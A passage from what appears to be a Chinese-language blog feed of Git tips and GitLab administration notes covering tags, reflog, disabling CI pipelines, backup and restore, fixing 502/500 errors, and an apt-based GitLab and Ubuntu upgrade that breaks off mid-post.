<h3 id="克隆所有子模块"><a href="#克隆所有子模块" class="headerlink" title="克隆所有子模块"></a>克隆所有子模块</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git <span class="built_in">clone</span> --recursive git://github.com/foo/bar.git</span><br></pre></td></tr></table></figure>
<p>如果已经克隆了:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git submodule update --init --recursive</span><br></pre></td></tr></table></figure>
<p><a name="delete-tag"></a></p>
<h3 id="删除标签-tag"><a href="#删除标签-tag" class="headerlink" title="删除标签(tag)"></a>删除标签(tag)</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git tag -d &lt;tag_name&gt;</span><br><span class="line">$ git push &lt;remote&gt; :refs/tags/&lt;tag_name&gt;</span><br></pre></td></tr></table></figure>
<p><a name="recover-tag"></a></p>
<h3 id="恢复已删除标签-tag"><a href="#恢复已删除标签-tag" class="headerlink" title="恢复已删除标签(tag)"></a>恢复已删除标签(tag)</h3><p>如果你想恢复一个已删除标签(tag), 可以按照下面的步骤: 首先, 需要找到无法访问的标签(unreachable tag):</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git fsck --unreachable | grep tag</span><br></pre></td></tr></table></figure>
<p>记下这个标签(tag)的hash，然后用Git的 <a href="http://git-scm.com/docs/git-update-ref" target="_blank" rel="noopener">update-ref</a>:</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git update-ref refs/tags/&lt;tag_name&gt; &lt;<span class="built_in">hash</span>&gt;</span><br></pre></td></tr></table></figure>
<p>这时你的标签(tag)应该已经恢复了。</p>
<p><a name="deleted-patch"></a></p>
<h3 id="已删除补丁-patch"><a href="#已删除补丁-patch" class="headerlink" title="已删除补丁(patch)"></a>已删除补丁(patch)</h3><p>如果某人在 GitHub 上给你发了一个pull request, 但是然后他删除了他自己的原始 fork, 你将没法克隆他们的提交(commit)或使用 <code>git am</code>。在这种情况下, 最好手动的查看他们的提交(commit)，并把它们拷贝到一个本地新分支，然后做提交。</p>
<p>做完提交后, 再修改作者，参见<a href="#commit-wrong-author">变更作者</a>。 然后, 应用变化, 再发起一个新的pull request。</p>
<h2 id="跟踪文件-Tracking-Files"><a href="#跟踪文件-Tracking-Files" class="headerlink" title="跟踪文件(Tracking Files)"></a>跟踪文件(Tracking Files)</h2><p><a href="i-want-to-change-a-file-names-capitalization-without-changing-the-contents-of-the-file"></a></p>
<h3 id="我只想改变一个文件名字的大小写，而不修改内容"><a href="#我只想改变一个文件名字的大小写，而不修改内容" class="headerlink" title="我只想改变一个文件名字的大小写，而不修改内容"></a>我只想改变一个文件名字的大小写，而不修改内容</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(master)$ git mv --force myfile MyFile</span><br></pre></td></tr></table></figure>
<p><a href="remove-from-git"></a></p>
<h3 id="我想从Git删除一个文件，但保留该文件"><a href="#我想从Git删除一个文件，但保留该文件" class="headerlink" title="我想从Git删除一个文件，但保留该文件"></a>我想从Git删除一个文件，但保留该文件</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(master)$ git rm --cached log.txt</span><br></pre></td></tr></table></figure>
<h2 id="配置-Configuration"><a href="#配置-Configuration" class="headerlink" title="配置(Configuration)"></a>配置(Configuration)</h2><p><a name="adding-command-aliases"></a></p>
<h3 id="我想给一些Git命令添加别名-alias"><a href="#我想给一些Git命令添加别名-alias" class="headerlink" title="我想给一些Git命令添加别名(alias)"></a>我想给一些Git命令添加别名(alias)</h3><p>在 OS X 和 Linux 下, 你的 Git的配置文件储存在 <figure class="highlight plain"><figcaption><span>部分添加了一些快捷别名(和一些我容易拼写错误的)，如下:</span></figcaption><table><tr><td class="code"><pre><span class="line"></span><br><span class="line">```vim</span><br><span class="line">[alias]</span><br><span class="line">    a = add</span><br><span class="line">    amend = commit --amend</span><br><span class="line">    c = commit</span><br><span class="line">    ca = commit --amend</span><br><span class="line">    ci = commit -a</span><br><span class="line">    co = checkout</span><br><span class="line">    d = diff</span><br><span class="line">    dc = diff --changed</span><br><span class="line">    ds = diff --staged</span><br><span class="line">    f = fetch</span><br><span class="line">    loll = log --graph --decorate --pretty=oneline --abbrev-commit</span><br><span class="line">    m = merge</span><br><span class="line">    one = log --pretty=oneline</span><br><span class="line">    outstanding = rebase -i @&#123;u&#125;</span><br><span class="line">    s = status</span><br><span class="line">    unpushed = log @&#123;u&#125;</span><br><span class="line">    wc = whatchanged</span><br><span class="line">    wip = rebase -i @&#123;u&#125;</span><br><span class="line">    zap = fetch -p</span><br></pre></td></tr></table></figure></p>
<p><a name="credential-helper"></a></p>
<h3 id="我想缓存一个仓库-repository-的用户名和密码"><a href="#我想缓存一个仓库-repository-的用户名和密码" class="headerlink" title="我想缓存一个仓库(repository)的用户名和密码"></a>我想缓存一个仓库(repository)的用户名和密码</h3><p>你可能有一个仓库需要授权，这时你可以缓存用户名和密码，而不用每次推/拉(push/pull)的时候都输入，Credential helper能帮你。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git config --global credential.helper cache</span><br><span class="line"><span class="comment"># Set git to use the credential memory cache</span></span><br></pre></td></tr></table></figure>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git config --global credential.helper <span class="string">'cache --timeout=3600'</span></span><br><span class="line"><span class="comment"># Set the cache to timeout after 1 hour (setting is in seconds)</span></span><br></pre></td></tr></table></figure>
<p><a href="#ive-no-idea-what-i-did-wrong"></a></p>
<h2 id="我不知道我做错了些什么"><a href="#我不知道我做错了些什么" class="headerlink" title="我不知道我做错了些什么"></a>我不知道我做错了些什么</h2><p>你把事情搞砸了：你 <code>重置(reset)</code> 了一些东西, 或者你合并了错误的分支, 亦或你强推了后找不到你自己的提交(commit)了。有些时候, 你一直都做得很好, 但你想回到以前的某个状态。</p>
<p>这就是 <code>git reflog</code> 的目的， <code>reflog</code> 记录对分支顶端(the tip of a branch)的任何改变, 即使那个顶端没有被任何分支或标签引用。基本上, 每次HEAD的改变, 一条新的记录就会增加到<code>reflog</code>。遗憾的是，这只对本地分支起作用，且它只跟踪动作 (例如，不会跟踪一个没有被记录的文件的任何改变)。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">(master)$ git reflog</span><br><span class="line">0a2e358 HEAD@&#123;0&#125;: reset: moving to HEAD~2</span><br><span class="line">0254ea7 HEAD@&#123;1&#125;: checkout: moving from 2.2 to master</span><br><span class="line">c10f740 HEAD@&#123;2&#125;: checkout: moving from master to 2.2</span><br></pre></td></tr></table></figure>
<p>上面的reflog展示了从master分支签出(checkout)到2.2 分支，然后再签回。 那里，还有一个硬重置(hard reset)到一个较旧的提交。最新的动作出现在最上面以 <code>HEAD@{0}</code>标识.</p>
<p>如果事实证明你不小心回移(move back)了提交(commit), reflog 会包含你不小心回移前master上指向的提交(0254ea7)。</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git reset --hard 0254ea7</span><br></pre></td></tr></table></figure>
<p>然后使用git reset就可以把master改回到之前的commit，这提供了一个在历史被意外更改情况下的安全网。</p>
<p>(<a href="https://www.atlassian.com/git/tutorials/rewriting-history/git-reflog" target="_blank" rel="noopener">摘自</a>).</p>
<h1 id="其它资源-Other-Resources"><a href="#其它资源-Other-Resources" class="headerlink" title="其它资源(Other Resources)"></a>其它资源(Other Resources)</h1><h2 id="书-Books"><a href="#书-Books" class="headerlink" title="书(Books)"></a>书(Books)</h2><ul>
<li><a href="https://git-scm.com/book/en/v2" target="_blank" rel="noopener">Pro Git</a> - Scott Chacon’s excellent git book</li>
<li><a href="https://github.com/pluralsight/git-internals-pdf" target="_blank" rel="noopener">Git Internals</a> - Scott Chacon’s other excellent git book</li>
</ul>
<h2 id="教程-Tutorials"><a href="#教程-Tutorials" class="headerlink" title="教程(Tutorials)"></a>教程(Tutorials)</h2><ul>
<li><a href="https://learngitbranching.js.org/" target="_blank" rel="noopener">Learn Git branching</a> 一个基于网页的交互式 branching/merging/rebasing 教程</li>
<li><a href="https://medium.com/@porteneuve/getting-solid-at-git-rebase-vs-merge-4fa1a48c53aa" target="_blank" rel="noopener">Getting solid at Git rebase vs. merge</a></li>
<li><a href="https://github.com/asmeurer/git-workflow" target="_blank" rel="noopener">git-workflow</a> - <a href="https://github.com/asmeurer" target="_blank" rel="noopener">Aaron Meurer</a>的怎么使用Git为开源仓库贡献</li>
<li><a href="http://hugogiraudel.com/2015/08/13/github-as-a-workflow/" target="_blank" rel="noopener">GitHub as a workflow</a> - 使用GitHub做为工作流的趣事, 尤其是空PRs</li>
</ul>
<h2 id="脚本和工具-Scripts-and-Tools"><a href="#脚本和工具-Scripts-and-Tools" class="headerlink" title="脚本和工具(Scripts and Tools)"></a>脚本和工具(Scripts and Tools)</h2><ul>
<li><a href="http://firstaidgit.io/" target="_blank" rel="noopener">firstaidgit.io</a> 一个可搜索的最常被问到的Git的问题</li>
<li><a href="https://github.com/unixorn/git-extra-commands" target="_blank" rel="noopener">git-extra-commands</a> - 一堆有用的额外的Git脚本</li>
<li><a href="https://github.com/tj/git-extras" target="_blank" rel="noopener">git-extras</a> - GIT 工具集 – repo summary, repl, changelog population, author commit percentages and more</li>
<li><a href="https://github.com/qw3rtman/git-fire" target="_blank" rel="noopener">git-fire</a> - git-fire 是一个 Git 插件，用于帮助在紧急情况下添加所有当前文件, 做提交(committing), 和推(push)到一个新分支(阻止合并冲突)。</li>
<li><a href="https://github.com/git-tips/tips" target="_blank" rel="noopener">git-tips</a> - Git小提示</li>
<li><a href="https://github.com/Originate/git-town" target="_blank" rel="noopener">git-town</a> - 通用，高级Git工作流支持！ <a href="http://www.git-town.com" target="_blank" rel="noopener">http://www.git-town.com</a></li>
</ul>
<h2 id="GUI客户端-GUI-Clients"><a href="#GUI客户端-GUI-Clients" class="headerlink" title="GUI客户端(GUI Clients)"></a>GUI客户端(GUI Clients)</h2><ul>
<li><a href="https://www.gitkraken.com/" target="_blank" rel="noopener">GitKraken</a> - 豪华的Git客户端 Windows, Mac &amp; Linux</li>
<li><a href="https://git-cola.github.io/" target="_blank" rel="noopener">git-cola</a> - 另外一个Git客户端 Windows &amp; OS X</li>
<li><a href="https://github.com/git-up/GitUp" target="_blank" rel="noopener">GitUp</a> - 一个新的Git客户端，在处理Git的复杂性上有自己的特点</li>
<li><a href="https://rowanj.github.io/gitx/" target="_blank" rel="noopener">gitx-dev</a> - 图形化的Git客户端 OS X</li>
<li><a href="https://www.sourcetreeapp.com/" target="_blank" rel="noopener">Source Tree</a> - 免费的图形化Git客户端 Windows &amp; OS X</li>
<li><a href="http://www.git-tower.com/" target="_blank" rel="noopener">Tower</a> - 图形化Git客户端 OS X(付费)</li>
</ul>
]]></content>
      <categories>
        <category>git</category>
      </categories>
  </entry>
  <entry>
    <title>gitlab关闭Pipeline</title>
    <url>/git/gitlab%E5%85%B3%E9%97%ADPipeline/</url>
    <content><![CDATA[<p>一路从10.5.5 升级到 12.9.5 后，发现项目默认启用了CI/CD Pipeline流水线，如果项目有 <code>git push</code> 就会触发Pipeline自动构建，构建失败会发邮件通知。<br>Pipeline这个东西暂时还没有研究过，<a href="https://docs.gitlab.com/ee/ci/pipelines/" target="_blank" rel="noopener">【有兴趣请参考】</a>，但我项目中无需自行自动构建和部署，所以暂时不需要，想关掉它。</p>
<blockquote>
<p><a href="https://www.jianshu.com/p/4cc441b1c8a3" target="_blank" rel="noopener">Gitlab-CI使用入门</a></p>
</blockquote>
<h3 id="每个项目关闭"><a href="#每个项目关闭" class="headerlink" title="每个项目关闭"></a>每个项目关闭</h3><p>在Gitlab网页端项目的 <code>设置 -&gt; 通用 -&gt; 可见性、项目功能、权限</code> 可以关闭 Pipeline。</p>
<h3 id="在项目配置文件中禁用"><a href="#在项目配置文件中禁用" class="headerlink" title="在项目配置文件中禁用"></a>在项目配置文件中禁用</h3><p>在项目的根目录创建一个 <code>.gitlab-ci.yml</code> 配置文件，在它里面设置暂时禁用某个作业，而不将其删除。</p>
<p>作业名称以点(.)开始，GitLab CI/CD不会处理它<br><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">.hidden_job:</span><br><span class="line">  script:</span><br><span class="line">    - run test</span><br></pre></td></tr></table></figure></p>
<h3 id="修改默认值"><a href="#修改默认值" class="headerlink" title="修改默认值"></a>修改默认值</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ vim /etc/gitlab/gitlab.rb</span><br><span class="line">gitlab_rails[<span class="string">'gitlab_default_projects_features_builds'</span>] = <span class="literal">false</span></span><br><span class="line"></span><br><span class="line">$ gitlab-ctl reconfigure</span><br></pre></td></tr></table></figure>
<p>这仅仅对新建项目有效，新建项目默认不开启Pipeline，但仍然可以通过 <code>设置 -&gt; 通用 -&gt; 可见性、项目功能、权限</code> 开启 Pipeline。</p>
<h3 id="Pipeline"><a href="#Pipeline" class="headerlink" title="Pipeline"></a>Pipeline</h3><p>在项目中根目录创建一个 <code>.gitlab-ci.yml</code> ，可以配置构建任务，gitlab有很多模板参考，比如Python</p>
<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="comment"># This file is a template, and might need editing before it works on your project.</span></span><br><span class="line"><span class="comment"># Official language image. Look for the different tagged releases at:</span></span><br><span class="line"><span class="comment"># https://hub.docker.com/r/library/python/tags/</span></span><br><span class="line"><span class="attr">image:</span> <span class="string">python:latest</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Change pip's cache directory to be inside the project directory since we can</span></span><br><span class="line"><span class="comment"># only cache local items.</span></span><br><span class="line"><span class="attr">variables:</span></span><br><span class="line">  <span class="attr">PIP_CACHE_DIR:</span> <span class="string">"$CI_PROJECT_DIR/.cache/pip"</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Pip's cache doesn't store the python packages</span></span><br><span class="line"><span class="comment"># https://pip.pypa.io/en/stable/reference/pip_install/#caching</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># If you want to also cache the installed packages, you have to install</span></span><br><span class="line"><span class="comment"># them in a virtualenv and cache it as well.</span></span><br><span class="line"><span class="attr">cache:</span></span><br><span class="line">  <span class="attr">paths:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">.cache/pip</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">venv/</span></span><br><span class="line"></span><br><span class="line"><span class="attr">before_script:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">python</span> <span class="string">-V</span>  <span class="comment"># Print out python version for debugging</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">pip</span> <span class="string">install</span> <span class="string">virtualenv</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">virtualenv</span> <span class="string">venv</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">source</span> <span class="string">venv/bin/activate</span></span><br><span class="line"></span><br><span class="line"><span class="attr">test:</span></span><br><span class="line">  <span class="attr">script:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">python</span> <span class="string">setup.py</span> <span class="string">test</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">pip</span> <span class="string">install</span> <span class="string">tox</span> <span class="string">flake8</span>  <span class="comment"># you can also use tox</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">tox</span> <span class="string">-e</span> <span class="string">py36,flake8</span></span><br><span class="line"></span><br><span class="line"><span class="attr">run:</span></span><br><span class="line">  <span class="attr">script:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">python</span> <span class="string">setup.py</span> <span class="string">bdist_wheel</span></span><br><span class="line">    <span class="comment"># an alternative approach is to install and run:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">pip</span> <span class="string">install</span> <span class="string">dist/*</span></span><br><span class="line">    <span class="comment"># run the command here</span></span><br><span class="line">  <span class="attr">artifacts:</span></span><br><span class="line">    <span class="attr">paths:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">dist/*.whl</span></span><br><span class="line"></span><br><span class="line"><span class="attr">pages:</span></span><br><span class="line">  <span class="attr">script:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">pip</span> <span class="string">install</span> <span class="string">sphinx</span> <span class="string">sphinx-rtd-theme</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">cd</span> <span class="string">doc</span> <span class="string">;</span> <span class="string">make</span> <span class="string">html</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">mv</span> <span class="string">build/html/</span> <span class="string">../public/</span></span><br><span class="line">  <span class="attr">artifacts:</span></span><br><span class="line">    <span class="attr">paths:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">public</span></span><br><span class="line">  <span class="attr">only:</span></span><br><span class="line">    <span class="bullet">-</span> <span class="string">master</span></span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>git</category>
      </categories>
  </entry>
  <entry>
    <title>gitlab备份恢复</title>
    <url>/git/gitlab%E5%A4%87%E4%BB%BD%E6%81%A2%E5%A4%8D/</url>
    <content><![CDATA[<h3 id="备份"><a href="#备份" class="headerlink" title="备份"></a>备份</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gitlab-rake gitlab:backup:create</span></span><br></pre></td></tr></table></figure>
<p>备份文件在 <code>/var/opt/gitlab/backups</code> 目录下，如：1528882180_2018_06_13_10.5.5_gitlab_backup.tar。</p>
<blockquote>
<p>备份过程中此目录会生成很多临时文件，比如数据库，如果由于空间不足导致备份失败，这个目录下的文件都可以删除释放空间，当然备份成功后，临时文件都会被清除。</p>
</blockquote>
<h3 id="迁移-恢复"><a href="#迁移-恢复" class="headerlink" title="迁移/恢复"></a>迁移/恢复</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> chmod 777 1528882180_2018_06_13_10.5.5_gitlab_backup.tar</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gitlab-rake gitlab:backup:restore BACKUP=1560416966</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>注意：迁移的话要将老服务器/var/opt/gitlab/backups目录下的备份文件拷贝到新服务器上的/var/opt/gitlab/backups，如果迁移前后的gitlab版本不一致，会报如下错误，所以版本必须要一致。</p>
</blockquote>
<h3 id="定时备份"><a href="#定时备份" class="headerlink" title="定时备份"></a>定时备份</h3><p>可以写脚本定时执行备份，<a href="https://yq.aliyun.com/articles/628158" target="_blank" rel="noopener">参考</a></p>
]]></content>
      <categories>
        <category>git</category>
      </categories>
  </entry>
  <entry>
    <title>gitlab错误修复</title>
    <url>/git/gitlab502%E9%94%99%E8%AF%AF%E4%BF%AE%E5%A4%8D/</url>
    <content><![CDATA[<h3 id="502错误修复"><a href="#502错误修复" class="headerlink" title="502错误修复"></a>502错误修复</h3><p>服务器断电关机，再开机时一般会导致 gitlab 502错误</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> gitlab-ctl status</span></span><br><span class="line">run: gitaly: (pid 1072) 689s; run: log: (pid 1071) 689s</span><br><span class="line">run: gitlab-monitor: (pid 1101) 689s; run: log: (pid 1090) 689s</span><br><span class="line">run: gitlab-workhorse: (pid 1092) 689s; run: log: (pid 1078) 689s</span><br><span class="line">run: logrotate: (pid 1115) 689s; run: log: (pid 1097) 689s</span><br><span class="line">run: nginx: (pid 1091) 689s; run: log: (pid 1077) 689s</span><br><span class="line">run: node-exporter: (pid 1111) 689s; run: log: (pid 1096) 689s</span><br><span class="line">run: postgres-exporter: (pid 1113) 689s; run: log: (pid 1098) 689s</span><br><span class="line">run: postgresql: (pid 1114) 689s; run: log: (pid 1095) 689s</span><br><span class="line">run: prometheus: (pid 14267) 0s; run: log: (pid 1089) 689s</span><br><span class="line">run: redis: (pid 1110) 689s; run: log: (pid 1094) 689s</span><br><span class="line">run: redis-exporter: (pid 1075) 689s; run: log: (pid 1074) 689s</span><br><span class="line">run: sidekiq: (pid 1076) 689s; run: log: (pid 1073) 689s</span><br><span class="line">run: unicorn: (pid 14244) 1s; run: log: (pid 1079) 689s</span><br><span class="line"><span class="meta">#</span><span class="bash"> 尝试重启</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gitlab-ctl restart</span></span><br><span class="line">ok: run: gitaly: (pid 14454) 0s</span><br><span class="line">ok: run: gitlab-monitor: (pid 14465) 1s</span><br><span class="line">ok: run: gitlab-workhorse: (pid 14469) 0s</span><br><span class="line">ok: run: logrotate: (pid 14482) 1s</span><br><span class="line">ok: run: nginx: (pid 14508) 0s</span><br><span class="line">ok: run: node-exporter: (pid 14514) 0s</span><br><span class="line">ok: run: postgres-exporter: (pid 14519) 1s</span><br><span class="line">ok: run: postgresql: (pid 14532) 0s</span><br><span class="line">ok: run: prometheus: (pid 14544) 0s</span><br><span class="line">ok: run: redis: (pid 14549) 0s</span><br><span class="line">ok: run: redis-exporter: (pid 14558) 0s</span><br><span class="line">ok: run: sidekiq: (pid 14575) 0s</span><br><span class="line">ok: run: unicorn: (pid 14587) 0s</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 按照官网的建议</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 如果所有服务都正常（没有down掉）还是502错误的话，重启sidekiq</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gitlab-ctl restart sidekiq</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 或者</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> gitlab-ctl hup unicorn</span></span><br></pre></td></tr></table></figure>
<h3 id="500错误修复"><a href="#500错误修复" class="headerlink" title="500错误修复"></a>500错误修复</h3><p>记录一次500错误，是由于强制关掉宿主机导致的，用502错误的修复方法无效果。<br><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 通过status知道prometheus和redis两个服务不能正常启动</span></span><br><span class="line">$ gitlab-ctl status</span><br><span class="line">***</span><br><span class="line">down: prometheu</span><br><span class="line">down: redis</span><br><span class="line">***</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看实时日志，发现prometheu(leveldb数据库存在问题要修复)和redis(dump.rdb存在问题要修复)在打印错误日志</span></span><br><span class="line">$ gitlab-ctl tail</span><br><span class="line"></span><br><span class="line"><span class="comment"># 网上有修复leveldb的方法，但是太麻烦，python的版本太旧，修复leveldb存在困难</span></span><br><span class="line"><span class="comment"># 考虑到prometheu(监控告警时序数据，项目中没用到)和redis(缓存数据，丢了可以重新生成)的数据不重要，所以决定把损坏的数据库文件做删除处理。</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 1. 停止所有服务</span></span><br><span class="line">$ gitlab-ctl stop</span><br><span class="line"></span><br><span class="line"><span class="comment"># 2. 移除prometheu的leveldb数据库</span></span><br><span class="line">$ <span class="built_in">cd</span> /var/opt/gitlab/prometheus</span><br><span class="line">$ ls</span><br><span class="line">data  prometheus.yml</span><br><span class="line">$ mv data data_old</span><br><span class="line"><span class="comment"># 3. 移除redis持久化数据库</span></span><br><span class="line">$ <span class="built_in">cd</span> /var/opt/gitlab/redis</span><br><span class="line">$ ls</span><br><span class="line">dump.rdb  redis.conf  redis.socket  temp-56637.rdb</span><br><span class="line">$ mv dump.rdb mump.rdb.bak</span><br><span class="line">$ mv temp-56637.rdb temp-56637.rdb.bak</span><br><span class="line">$ ls</span><br><span class="line">$ mump.rdb.bak  redis.conf  redis.socket  temp-56637.rdb.bak</span><br><span class="line"></span><br><span class="line"><span class="comment"># 4. 重新启动服务</span></span><br><span class="line">$ gitlab-ctl start</span><br><span class="line">$ gitlab-ctl restart sidekiq</span><br><span class="line">$ gitlab-ctl hup unicorn</span><br><span class="line"><span class="comment"># 5. 浏览器打开Gitlab正常，仓库数据没有丢失。</span></span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>git</category>
      </categories>
  </entry>
  <entry>
    <title>Gitlab升级笔记</title>
    <url>/git/gitlab%E5%8D%87%E7%BA%A7%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>2017年在 <code>Ubuntu14.04</code> 中安装 <code>Gitlab社区版</code>  ，自从做过一次升级至版本 <code>10.5.5</code> 后，直到目前没升级过，版本落后太多，而且最近暴露的日志等漏洞也波及到Gitlab，为了安全要升级一下。</p>
<blockquote>
<p>在官网得知：如果想要升级到最新版本，得一个一个版本的升级，不能跨版本升级，每个版本之间有依赖，感觉好麻烦。</p>
</blockquote>
<p>之前都是下载deb包安装升级的，这次尝试一下apt升级。</p>
<blockquote>
<p>注意：下面的命令都是以root的身份执行，普通用户需带sudo</p>
</blockquote>
<h3 id="一、升级Gitlab失败"><a href="#一、升级Gitlab失败" class="headerlink" title="一、升级Gitlab失败"></a>一、升级Gitlab失败</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Welcome to Ubuntu 14.04.6 LTS (GNU/Linux 4.4.0-148-generic x86_64)</span><br><span class="line"></span><br><span class="line"> * Documentation:  https://help.ubuntu.com/</span><br><span class="line"></span><br><span class="line">  System information as of Tue Jan 18 14:19:39 CST 2022</span><br><span class="line"></span><br><span class="line">  System load: 0.0                 Memory usage: 2%   Processes:       185</span><br><span class="line">  Usage of /:  10.7% of 116.77GB   Swap usage:   0%   Users logged <span class="keyword">in</span>: 0</span><br><span class="line"></span><br><span class="line">  Graph this data and manage this system at:</span><br><span class="line">    https://landscape.canonical.com/</span><br><span class="line"></span><br><span class="line">UA Infrastructure Extended Security Maintenance (ESM) is not enabled.</span><br><span class="line"></span><br><span class="line">5 updates can be installed immediately.</span><br><span class="line">4 of these updates are security updates.</span><br><span class="line">To see these additional updates run: apt list --upgradable</span><br><span class="line"></span><br><span class="line">Enable UA Infrastructure ESM to receive 150 additional security updates.</span><br><span class="line">See https://ubuntu.com/advantage or run: sudo ua status</span><br><span class="line"></span><br><span class="line">New release <span class="string">'16.04.7 LTS'</span> available.</span><br><span class="line">Run <span class="string">'do-release-upgrade'</span> to upgrade to it.</span><br><span class="line"></span><br><span class="line">Your Hardware Enablement Stack (HWE) is supported until April 2019.</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下载&amp;添加公钥</span></span><br><span class="line">$ curl https://packages.gitlab.com/gpg.key 2&gt; /dev/null | sudo apt-key add - &amp;&gt;/dev/null</span><br><span class="line">$ vim /etc/apt/sources.list.d/gitlab-ce.list</span><br><span class="line"><span class="comment"># 写入这一行，注意，不同的ubuntu版本，最后的代号不一样，trusty是ubuntu 14.04的代号</span></span><br><span class="line">deb https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/ubuntu trusty main</span><br><span class="line"></span><br><span class="line"><span class="comment"># source.list 最好切换到国内的，如清华大学的源</span></span><br><span class="line">$ apt update</span><br><span class="line"></span><br><span class="line"><span class="comment"># 查看是否有新版本可以升级</span></span><br><span class="line">$ apt list --upgradable</span><br><span class="line">Listing... Done</span><br><span class="line">gitlab-ce/trusty 11.10.8-ce.0 amd64 [upgradable from: 10.5.5-ce.0]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 升级gitlab-ce/trusty</span></span><br><span class="line">$ apt upgrade</span><br><span class="line">Reading package lists... Done</span><br><span class="line">Building dependency tree</span><br><span class="line">Reading state information... Done</span><br><span class="line">Calculating upgrade... Done</span><br><span class="line">The following packages were automatically installed and are no longer required:</span><br><span class="line">  amd64-microcode linux-modules-extra-4.4.0-148-generic</span><br><span class="line">Use <span class="string">'apt-get autoremove'</span> to remove them.</span><br><span class="line">The following packages have been kept back:</span><br><span class="line">  linux-generic-lts-xenial linux-headers-generic-lts-xenial</span><br><span class="line">  linux-image-generic-lts-xenial</span><br><span class="line">The following packages will be upgraded:</span><br><span class="line">  gitlab-ce</span><br><span class="line">1 upgraded, 0 newly installed, 0 to remove and 3 not upgraded.</span><br><span class="line">Need to get 620 MB of archives.</span><br><span class="line">After this operation, 488 MB of additional disk space will be used.</span><br><span class="line">Do you want to <span class="built_in">continue</span>? [Y/n] Y</span><br><span class="line">Get:1 https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/ubuntu/ trusty/main gitlab-ce amd64 11.10.8-ce.0 [620 MB]</span><br><span class="line">Err https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/ubuntu/ trusty/main gitlab-ce amd64 11.10.8-ce.0</span><br><span class="line">  HttpError404</span><br><span class="line">E: Failed to fetch https://mirrors.tuna.tsinghua.edu.cn/gitlab-ce/ubuntu/pool/trusty/main/g/gitlab-ce/gitlab-ce_11.10.8-ce.0_amd64.deb  HttpError404</span><br><span class="line"></span><br><span class="line">E: Unable to fetch some archives, maybe run apt-get update or try with --fix-missing?</span><br><span class="line"><span class="comment"># 遇到了404错误</span></span><br></pre></td></tr></table></figure>
<p>查看一下这个链接，原来trusty(14)已经被删除了，但xenial(16)还在。看来得先升级到ubuntu16.04。</p>
<h3 id="二、升级Ubuntu16-04"><a href="#二、升级Ubuntu16-04" class="headerlink" title="二、升级Ubuntu16.04"></a>二、升级Ubuntu16.04</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash"> 升级到ubuntu 16.04</span></span><br><span class="line"><span class="meta">$</span><span class="bash"> <span class="keyword">do</span>-release-upgrade</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> 等待下载更新（要保证有足够的磁盘空间）</span></span><br></pre></td></tr></table></figure>
<p>升级ubuntu16.04后</p>
